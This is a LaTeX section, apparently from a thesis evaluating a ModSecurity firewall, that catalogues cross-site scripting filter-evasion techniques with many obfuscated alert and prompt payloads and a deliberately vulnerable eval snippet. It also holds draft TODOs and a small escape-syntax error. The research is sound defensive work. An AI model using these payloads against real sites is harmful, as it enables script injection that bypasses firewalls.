\subsection{Cross-site Scripting Payloads}
\label{sec:xsstech}
This section lists evasion techniques applicable to Cross-site Scripting payloads.

\subsubsection{Tag modification}
In a case, where regex filters are configured to look for html tags, modifying html tags might make a payload evade the filter. Possible modifications include:
\begin{itemize}
	\item prepending the tag with an additional \verb|<|: \verb|<<script>alert('XSS')</script>|
	\item omitting the closing tag: \verb|<script>alert('XSS')|
	\item using double open angle brackets: \verb|<iframe src=javascript:alert('XSS') <|
	\item using uncommon tags: \\ \verb|<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE>|
\end{itemize}
Technique by \cite{medium/allypetitt}

\subsubsection{Space replace}
A regex filter that is expecting a space inside a html tag at certain positions can be evaded by replacing the space with the forward slash: \verb|/|.
For instance, the payload

\begin{lstlisting}[style=basicStyle, language=Python]
<img src="1" onerror="alert('XSS')">
\end{lstlisting}

becomes

\begin{lstlisting}[style=basicStyle, language=Python]
<img/src="1"/onerror="alert('XSS')">
\end{lstlisting}

Technique by \cite{medium/allypetitt}. {\color{red}TODO: link to evaluation}

\subsubsection{HTML character references}
\label{sec:htmlcharreftech}
Sometimes Cross-site scripting payloads are using HTML elements to deliver a payload. Inside such payloads, HTML character references can be used to obscure the payload. The HTML specification states that in certain cases, text may be mixed with character references. Character references must start with a U+0026 AMPERSAND character (\&). Following this, there are three possible kinds of character references: Named character references, Decimal numeric character references or Hexadecimal numeric character references. \cite{www/html}

Considering the example payload using the \verb|<a>| element to exploit a stored Cross-site scripting vulnerability:

\begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
<a href=javascript:alert('a')>ClickMeFor$</a>
\end{lstlisting}

which is semantically equal to the following payload where a named character reference is used to substitute the left parenthesis of the initial payload:

\begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
<a href=javascript:alert^\&lpar;^'a')>ClickMeFor$</a>
\end{lstlisting}

If a decimal numeric character reference is used to substitute a latin small letter a, the initial payload becomes the following:

\begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
<a href=jav^\&\#97;^script:alert('a')>ClickMeFor$</a>
\end{lstlisting}

Finally, if hexadecimal numeric character references are used to substitute a latin small letter a as well as the left parenthesis, the initial payload becomes:

\begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
<a href=jav^\&\#x61;script:alert\&\#x28;^'a')>ClickMeFor$</a>
\end{lstlisting}

The evaluation results of payloads obscured using this technique are stated under Section~\ref{sec:htmlcharrefsingleeva} (single iteration) and Section~\ref{sec:htmlencjsesc} (multi iteration).

\subsubsection{From charcode}
\label{sec:fromcharcodetech}
Evading signature based Web application firewalls that match on payloads containing JavaScript statements can be achieved by syntactically modifying the payload String. This technique can be used if the JavaScript statements constituting the malicious part of the payload are passed in string format. Rules blocking requests based on detected character sequences might be evaded by substituting payloads with a sematically equivalent but syntactically different String. This and the next two subsections will detail three different methods to syntactically alter payload strings in JavaScript.

With the built-in \verb|String| object, JavaScript provides the static \verb|fromCharCode| function. The \verb|String.fromCharCode()| function returns a string created from the sequence of UTF-16 code units given as parameters to the function. \cite{js/fromCharCode}

For instance, the payload:

\begin{lstlisting}[style=basicStyle, language=Python]
eval(String.fromCharCode(0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29))
\end{lstlisting}

is semantically equal to the payload:

\begin{lstlisting}[style=basicStyle, language=Python]
eval("alert('xss')")
\end{lstlisting}

The obscured payload uses charcodes specified in decimal or hexadecimal format to compose the malicious payload string. Evaluation results using this evasion technique are stated under Section~\ref{sec:charcodesingleiter} and Section~\ref{sec:charcodemultiiter}.

Technique by \cite{asecsite/jsobf1}.

\subsubsection{String concatenation}
\label{sec:stringconc}
In cases where the payload contains statements to be executed and these are passed in string format, string concatenation might be used to obscure the payload. This technique is further limited to cases where the string containing the statements is evaluated on the target. An example for vulnerable code on a target is the following:

\begin{lstlisting}[style=basicStyle, language=Python]
<some html code that contains a div with id="div1">

<script>
const toEvaluate = "<some statements>" + route.query.payload

document.getElementById('div1').insertAdjacentHTML('afterbegin',`<img src=0 onerror=${eval(toEvaluate)}>`)
</script>
\end{lstlisting}

If \verb|route.query.payload| is replaced by the payload string, this string will be evaluated as part of the statements that compose the variable \verb|toEvaluate|. Wether the payload will be executed with the desired effect depends on the statements that compose \verb|toEvaluate|. In the following, it will be asumed that these statements do not have any effect.

If the payload:

\begin{lstlisting}[style=basicStyle, language=Python]
"alert('concatenation')"
\end{lstlisting}

is sent towards the target Web application, it will be concatenated to the \verb|toEvaluate| string and subsequently evaluated by the call to the \verb|eval()| function. With the initial payload, this is where the desired effect is achieved.

If a Web application firewall filters and blocks this payload, the payload can be obscured by using string concatenation. If the target executes the afromentioned or similar vulnerable code, following obscured payload is also semantically valid:

\begin{lstlisting}[style=basicStyle, language=Python]
"alert" + "('concatenation')"
\end{lstlisting}

Again, the payload string will be concatenated to the \verb|toEvaluate| string and subsequently evaluated by the call to the \verb|eval()| function. Subsequently, the evaluated and thereby concatenated string will be called on as soon as the \verb|img| with \verb|src=0| fails to load an image from the invalid 0-source.

Results of evaluating the tested Web application firewall against this technique are stated under Section~\ref{sec:stringconcsingleiter}, Section~\ref{sec:charcodemultiiter} and Section~\ref{sec:funconstrconbypass}. This technique is especially useful in combination with methods to force the evaluation of statements sent inside a payload string. If forced evaluation is achieved by parts of the payload, this technique does no longer depend on evaluation by the vulnerable code. Methods to achieve forced evaluation are stated under Section~\ref{sec:eval} and Section~\ref{sec:functionconstructor}.


\subsubsection{JavaScript comment substitution}
\label{sec:jscommentsub}
During the evaluation and subsequent payload validation according to the methodology stated under Section~\ref{sec:evaluation} it turned out that if a payload is to be concatenated to an HTML attribute like in the vulnerable test code snippet, whitespaces in the payload string are causing the concatenated string to be split. An example is laid out under Section~\ref{sec:funconstrconbypass}. 

Considering the JavaScript statements: 

\begin{lstlisting}[style=basicStyle,language=Python]
var s = 5; prompt(s, s)
\end{lstlisting}

In order to avoid passing whitespaces inside the JavaScript payload string, whitespaces can be replaced by inline comments:

\begin{lstlisting}[style=basicStyle,language=Python]
var/**/s/**/=/**/5;/**/prompt(s,/**/s)
\end{lstlisting}

Semantically, both code snippets are equal as they will both be executed with the desired effect. 

Results of evaluating the tested Web application firewall against this technique are stated under Section~\ref{sec:jscommentsubsingleiter} and Section~\ref{sec:funconstrconbypass}.

\subsubsection{JavaScript character escaping}
\label{sec:jsescape}
In JavaScript, characters can be represented by escape sequences:

\begin{itemize}
	\item Hex escape: \verb|\xHH| (exactly two hexadecimal digits)
	\item Unicode escape: \verb|\xHHHH| (exactly four hexadecimal digits)
	\item Unicode code point escape: \verb|\u{...}| (one or more hexadecimal digits)
	\item Octal escape: \verb|\Ddd| (one to three octal digits)
	\item Single character escape: \verb|\C| (one character)
\end{itemize}

Single character escapes are subject to some reserved characters represented by the regular expression: \verb|\\[bfnrtv0'"\\]|. Apart from those, any character without special meaning can be escaped using single character escape. For instance: \verb|'\a' == 'a'|.

Unicode code point escapes have been introduced in ES6, octal escapes have been deprecated since ES5. As such, unicode code point escapes might not be recognized by outdated firewall rulesets, octal escapes might not be valid on some up-to-date targets.

The following table details where certain escape sequences can be used:

\begin{table}[h!]
	\centering
	\begin{tabular}{|c||c| c| c| c|c|}
		\hline
		Location          & Hex & Unicode & Unicode code point & Octal & Single character \\
		\hline\hline
		String literals   & y   & y       & y                  & y     & y                \\
		Template literals & y   & y       & y                  & n     & y                \\
		Identifiers       & n   & y       & y                  & n     & n                \\
		\hline
	\end{tabular}
	\caption{Locations where escape sequences can be used in JavaScript}
\end{table}
\cite{exploringes6/escapeseq,bynens/escape,js/lexicalgrammar}

This technique is used under Section~\ref{sec:jsescapesingleiter} during single iteration evalution and under Section~\ref{sec:avoidingbypassA}, Section~\ref{sec:htmlencjsesc} and Section~\ref{sec:jsescapemultiiter} during multi iteration evaluation.


\subsubsection{Tagged Template Literals}
\label{sec:taggedtemplateliterals}
Tagged Template Literals can be used in JavaScript payloads to avoid detection of JavaScript function calls in an HTTP request payload. Dr. Alex Rauschmeyer explains Tagged Template Literals in ``Exploring ES6'':
\begin{quotation} Tagged Template Literals are function calls whose parameters are provided via template literals. [...]
	The following is a tagged template literal (short: tagged template):
	\begin{lstlisting}
tagFunction`Hello ${firstName} ${lastName}!`
\end{lstlisting}
	Putting a template literal after an expression triggers a function call, similar to how a parameter list (comma-separated values in parentheses) triggers a function call. The previous code is equivalent to the following function call (in reality, first parameter is more than just an Array, but that is explained later).
	\begin{lstlisting}
tagFunction(['Hello ', ' ', '!'], firstName, lastName)
\end{lstlisting}
	Thus, the name before the content in backticks is the name of a function to call, the tag function.
	\cite{exploringes6/templatelit}
\end{quotation}

As the function \verb|alert| can be called with an array as first parameter, it is possible to substitute the payload with \verb|alert`XSS`|. The substitute payload might evade regex filtering that looks for a function name followed by an opening \verb|(|.
Technique by \cite{onecons/wafbypass}.

Results of using this technique in payloads to evaluate the tested firewall configuration are stated under Section~\ref{sec:taggedtemplateliteralsevaluation} during single iteration evaluation and Section~\ref{sec:avoidingbypassA} and Section~\ref{sec:avoidingbypassB} during multi iteration evaluation.


\subsubsection{eval() function}
\label{sec:eval}

JavaScript payloads that are being passed in string format can be executed using the eval function. The \verb|eval()| function will evaluate the source string given as an argument and return its completion value. \cite{js/eval}
A possible usecase for \verb|eval()| in the quest to bypass a \gls{waf} is the splitting of function names that would cause a HTTP request to get rejected by the firewall.
Looking at Listing~\ref{lst:alertXSSblocked}, it is clear that the function call \verb|alert('XSS')| is being blocked by the ModSecurity firewall using CRS 4.1.0.
To avoid a match on \verb|alert(|, it is possible to split the function call into parts \verb|al|, \verb|e| and \verb|rt('XSS')| by using string concatenation in the form of \verb|`al` + `e` + `rt('XSS')`|.
Sending the payload in this form will not cause the the desired effect, as a JavaScript interpreter will interpret the payload as a string instead of a function call to the \verb|alert()| function.
Using the \verb|eval()| function in combination with the splitted string solves this problem. Passing the string \verb|`al` + `e` + `rt('XSS')`| in the form of \verb|eval(`al` + `e` + `rt('XSS')`)| as an argument to the \verb|eval()| function will cause the string to be evaluated and interpreted. Technique inspired by \cite{onecons/wafbypass}.

\subsubsection{Function constructor}
\label{sec:functionconstructor}

When using the function \verb|eval()| (see Section~\ref{sec:eval}) causes a request to be blocked, a substitute payload in the form of

\begin{lstlisting}[style=basicStyle,language=Python]
[].constructor.constructor(`alert('XSS')`)()
\end{lstlisting}

is available in JavaScript.

Calling \verb|[]| will create an empty array, which is a special kind of object.
Any kind of object in JavaScript, with the exception of null prototype objects, will have a constructor property on its prototype. \cite{js/object}

The Array objects constructor can be accessed by calling \verb|.constructor| on an instance of Array, like \verb|[].constructor|. \cite{js/array}
Constructors are technically regular functions. \cite{js/constructor}
As such, they are Function objects. Function objects have a constructor themselfes, which again is called using the \verb|.constructor| notation.

Using \verb|[].constructor.constructor| will yield access to the Function() constructor.
Calling the Function() constructor directly can create functions dynamically, similar to using \verb|eval()|.
The difference being that the Function() constructor creates functions that execute in the global scope only. More on this limitation will be laid out under Section~\ref{sec:payloadlimitations}.

The Function() constructor takes a variable count of arguments. The first $n - 1$ arguments are the \quotes{names to be used by the function as formal argument names. Each must be a string that corresponds to a valid JavaScript parameter [...]} \cite{js/function}
The last argument given to the Function() constructor is expected to be a string containing the JavaScript statements compromising the function definition. \cite{js/function}

Therefore, the afromentioned substitute for \verb|eval()|:

\begin{lstlisting}[style=basicStyle,language=Python]
[].constructor.constructor(`alert('XSS')`)()
\end{lstlisting}

will create a function with the function body \verb|alert('XSS')| and call it directly.
In other words: It will call a function that calls \verb|alert('XSS')|.
Technique by \cite{onecons/wafbypass}.

A more straightforward and less obscure way of accessing the Function() contructor is to call it directly:
\begin{quote}
	\verb|Function()| can be called with or without \verb|new|. Both create a new \verb|Function| instance. \cite{js/function}
\end{quote}
Depending on the firewall configuration, a WAF might use regex filtering to detect usage of \verb|Function()|.
In this case, accessing the Function() constructor via an array object can be an alternative.

In addition to accessing the function constructor via the \verb|constructor| function present on most object prototypes, the function constructor can also be accessed via other functions present on certain object prototypes. For instance, the \verb|map| function is present on the Array object's prototype. Therefore the following payload is also valid:

\begin{lstlisting}[style=basicStyle,language=Python,escapeinside=\^\^]
[].^map^.constructor(`alert('XSS')`)()
\end{lstlisting}

(Technique using \verb|map| by \cite{mk/elementsVid}).

Depending on the context where the payload will be inserted, sometimes the function constructor can not be accessed using empty arrays or empty objects. Such a case can occur when there are statements in the context prior to the point of payload insertion. Not explicitly terminated statements that depend on JavaScripts automatic semicolon insertion can cause the payload to not execute correctly. In some cases, when using empty arrays or objectsin the beginning of the payload, the automatic semicolon insertion might not insert a semicolon between the end of the statement prior to the point of payload insertion and the beginning of the payload. Subsequently, the JavaScript parser will throw a SyntaxError at this point. One example for such a case is mentioned under Section~\ref{sec:charcodemultiiter}. MDN contributors state details around automatic semicolon insertion under the Lexical grammar section of their JavaScript reference \cite{js/autosemi}.



If, for any reason, the Array object can not be used, there are substitutes available in the form of JavaScript's standard built-in objects. \cite{js/builtin}
JavaScript's built-in objects include but are not limited to built-in global functions that can be used as a substitute:

\begin{lstlisting}[style=basicStyle,language=Python,escapeinside=\^\^]
isNaN.constructor(`alert('XSS')`)()
\end{lstlisting}

as well as a multitude of other built-in objects, for example the \verb|Error| object:

\begin{lstlisting}[style=basicStyle,language=Python,escapeinside=\^\^]
Error.constructor.constructor(`alert('XSS')`)()
\end{lstlisting}

If firewall rule maintainers implement new rules to specifically block the access to the function constructor by blacklisting all built-in JavaScript objects, there is still the possibility that in the time after an update to JavaScript (ECMAScript) some newly released built-in objects are not blocked yet. This can be caused by either the rule maintainers slow adaption speed or a missing update on the Web application firewall.

In any case, the access to the \verb|Function| constructor is possible on self defined objects too. The following code sample displays this:

\begin{lstlisting}[style=basicStyle,language=Python,escapeinside=\^\^]
const someObject = { someProperty: "some string" }
someObject.constructor.constructor(`alert('XSS')`)()
\end{lstlisting}

If the availablitiy of custom object references in the execution scope of the payload-code is given, custom object references can be used to create a function via the \verb|Function| constructor.

The results of evaluating the ModSecurity firewall using CRS4.1 by applying this evasion technique are shown under Section~\ref{sec:functionconstructorsingleeva} for the single iteration evaluation and Section~\ref{sec:funconstrconbypass} for the multi iteration evaluation.

Firewall rules for the OWASP CoreRuleSet in version 4.1 are proposed under Section~\ref{sec:rulespropfunctionconstructor} and Section~\ref{sec:rulespropfunctionconstructorreflection}.


\subsubsection{Square bracket notation}
\label{sec:sbn}
JavaScript provides a square bracket notation to access properties of an Object. It is used to access multiword properties as well as provide a way of obtaining property names as the result of an expression. \cite{js/brackets}

This square bracket notation allows to substitute the dot notation in a case where using the dot notation is not feasible or blocked by firewall rules.
For instance, in a payload composed using the function constructor:

\begin{lstlisting}[style=basicStyle,language=Python]
[].constructor.constructor(`alert('XSS')`)()
\end{lstlisting}

the dot notation can be substituted by the square bracket notation:

\begin{lstlisting}[style=basicStyle,language=Python]
[]["constructor"]["constructor"](`alert('XSS')`)()
\end{lstlisting}

The \quotes{String replace}, \quotes{JSFuck} and \quotes{Aurebesh.js} techniques mentioned in the further proceedings of this section heavily rely on JavaScript's square bracket notation.



\subsubsection{String replace}
\label{sec:stringreplace}
When passing certain characters is not feasible, there is a chance they can be substituted in a string replacement strategy using the \verb|+| operator.
A part of the description of the \verb|+| operator in JavaScript states:
\begin{quote}
	The + operator is overloaded for two distinct operations: numeric addition and string concatenation. When evaluating, it first coerces both operands to primitives. ... \cite{js/+}
\end{quote}
In the process of primitive coercion, objects are converted to primitives by calling their \verb|[@@toPrimitive]()|, \verb|valueOf()| and \verb|toString()| methods in the given order. Date and Symbol objects are the only built-in objects that override the \verb|[@@toPrimitive]()| method.
Objects without an override for the \verb|[@@toPrimitive]()| method inherit \verb|valueOf| from
\\ \verb|Object.prototype.valueOf|, which returns the object itself.
Since the return value is an object, it is ignored and \verb|toString()| is called instead. \cite{js/primitiveCoercion}

In the code \verb|open + []|, \verb|open| is a built-in Function object, \verb|[]| is a built-in Array object.
In the process of primitive coercion, for both, their \verb|toString()| method is being called.
When they are joined by the \verb|+| operator, it results in a String in the form of \verb|open.toString()| concatenated with \verb|[].toString()|. The result is equal to \verb|open.toString()| (see Listing~\ref{lst:opentostring}) as \verb|[].toString()| returns an empty String.

\begin{lstlisting}[style=basicStyle, caption=open.toString() in JavaScript, label={lst:opentostring}]
function open() {
    [native code]
}
\end{lstlisting}

In JavaScript, array-like access to String objects is possible. \cite{js/stringbrackets} For example, \verb|[open+[]][0][13]| returns the character \verb|(|. \verb|[open+[]][0][14]| returns the character \verb|)|. Listing~\ref{lst:opentostringindices} visualizes open.toString() with the corresponding indices.

\begin{lstlisting}[style=basicStyle, caption=open.toString() with indices in JavaScript, label={lst:opentostringindices}]
f u n c t i o n   o p  e  n  (  )     {  \n
0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21

[  n  a  t  i  v  e     c  o  d  e  ]  \n }
22 23 24 25 26 27 28 29 30 31 32 33 34 35 36
\end{lstlisting}


\subsubsection{JSFuck}
\label{sec:jsfuck}
JSFuck was created by Martin Kleppe to write any valid JavaScript with only 6 different characters. 6 different characters is close to the possible Minimum, there are suggestions to use only 5 different characters, but they have some preconditions. \cite{mk/five, tc39/pipeline}
Martin Kleppe describes JSFuck as follows:
\begin{quote}
	JSFuck is an esoteric and educational programming style based on the atomic parts of JavaScript. It uses only six different characters to write and execute code.

	It does not depend on a browser, so you can even run it on Node.js. \cite{mk/jsfuck}
\end{quote}
Encoding the payload \verb|alert(1)| in JSFuck results in following payload:
\begin{lstlisting}[style=basicStyle, caption=alert(1) in JSFuck, label={lst:alert1jsfuck}]
  (![] + [])[+!+[]] +
    (![] + [])[!+[] + !+[]] +
    (!![] + [])[!+[] + !+[] + !+[]] +
    (!![] + [])[+!+[]] +
    (!![] + [])[+[]] +
    ([][
      (![] + [])[+[]] +
        (![] + [])[!+[] + !+[]] +
        (![] + [])[+!+[]] +
        (!![] + [])[+[]]
    ] + [])[+!+[] + [!+[] + !+[] + !+[]]] +
    [+!+[]] +
    ([+[]] +
      ![] +
      [][
        (![] + [])[+[]] +
          (![] + [])[!+[] + !+[]] +
          (![] + [])[+!+[]] +
          (!![] + [])[+[]]
      ])[!+[] + !+[] + [+[]]],
\end{lstlisting}

This payload is 297 characters long, which is around 37 times more than the 8 characters forming \verb|alert(1)|. On usage of JSFuck, payload size increases dramatically. Encoding the payload \verb|alert('XSS')| already requires 5739 characters (see Listing~\ref{lst:alertxssjsfuck}). If payload size is not limited, a lot of obscuration can be gained by using JSFuck to obscure payloads. The JSFuck website provides an encoder that is ready to use. It supports implemented evaluating of the payload such that no additional measure is needed to execute the payload. \cite{mk/jsfuck}


\subsubsection{Aurebesh.js}
\label{sec:aurebesh}
Similar to JSFuck, Aurebesh.js was created by Martin Kleppe. In its minimalistic form, it allows to write a valid JavaScript function calling \verb|alert(1)| with the characters \verb|() + [] ! " = {}| as well as one other character of choice. Aurebesh.js allows the choice of up to 9 distinct characters or words. In the case where the characters \verb|A B C D E F G H I| are chosen, the system is explained as follows:
\begin{lstlisting}[style=basicStyle, caption=Aurebesh.js explanation \cite{mk/aurebesh}, label={lst:aurebeshexplanation}]
		A = ''              // empty string
		B = !A + A          // "true"
		C = !B + A          // "false"
		D = A + {}          // "[object Object]"
		E = B[A++]          // "t" = "true"[0]
		F = B[G = A]        // "r" = "true"[1]
		H = ++G + A         // 2, 3
		I = D[G + H]        // "c"

		B[
		  I +=              // "c"
		    D[A] +          // "o" = "object"[0]
		    (B.C+D)[A] +    // "n" = "undefined"[1]
		    C[H] +          // "s" = "false"[3]
		    E +             // "t"
		    F +             // "r"
		    B[G] +          // "u" = "true"[2]
		    I +             // "c" = "[object]"[5]
		    E +             // "t"
		    D[A] +          // "o" = "[object]"[1]
		    F               // "r"
		][
		  I                 // "constructor"
		](
		  C[A] +            //  "a"
		  C[G] +            //  "l"
		  B[H] +            //  "e"
		  F +               //  "r"
		  E +               //  "t"
		  "(A)"             // "(1)"
		)()
\end{lstlisting}
If less than 9 characters (or words) are supplied, Aurebesh.js will reuse some characters by concatenating them together to create 9 different variables. \cite{mk/aurebesh}

In contrast to the author who is pursuing the translation of JavaScript into other writing systems, antagonist actors might use this idea to translate \gls{xss} payloads that are blocked by a Web application firewall into \gls{xss} payloads that bypass Web application firewalls. Antagonist actors are not limited to just using 9 variables when crafting \gls{xss} payloads using Aurebesh.js. They can use Aurebesh.js as a base for their payloads while adding more characters and variables as needed.
The obfuscation gained by using Aurebesh.js might make payloads evade detection while the added payload content maliciously influences the Web application.
As a proof of concept, the function \verb|alert| has been substituded with the function \verb|prompt| in the following example:

\begin{lstlisting}[style=basicStyle, caption=Aurebesh.js obfuscation of prompt, label={lst:aurebeshprompt}]
		A = ''              // empty string
		B = !A + A          // "true"
		C = !B + A          // "false"
		D = A + {}          // "[object Object]"
		E = B[A++]          // "t" = "true"[0]
		F = B[G = A]        // "r" = "true"[1]
		H = ++G + A         // 2, 3
		I = D[G + H]        // "c"

		B[
		  I +=              // "c"
		    D[A] +          // "o" = "object"[0]
		    (B.C+D)[A] +    // "n" = "undefined"[1]
		    C[H] +          // "s" = "false"[3]
		    E +             // "t"
		    F +             // "r"
		    B[G] +          // "u" = "true"[2]
		    I +             // "c" = "[object]"[5]
		    E +             // "t"
		    D[A] +          // "o" = "[object]"[1]
		    F               // "r"
		][
		  I                 // "constructor"
		](
		  'p' +             // "p"
		  F +               // "r"
		  D[A] +            // "o"
		  'm' +             // "m"
		  'p' +             // "p"
		  E +               // "t"
		  '(A,++A)'         // "(1,2)"
		)()
\end{lstlisting}

For the test result of this payload see Listing~\ref{lst:aurebeshpromptbypass}.

{\color{red} evtl hier noch eine weitere, interessantere payload (fetch)}


Mentioned evasion techniques under this section (Section~\ref{sec:firewallevasiontechniques}) will be used to create targeted malicious requests in an effort to evaluate the performace of a tested firewall configuration against these requests. The evaluation methodology will be explained in the following section (Section~\ref{sec:evaluation}).
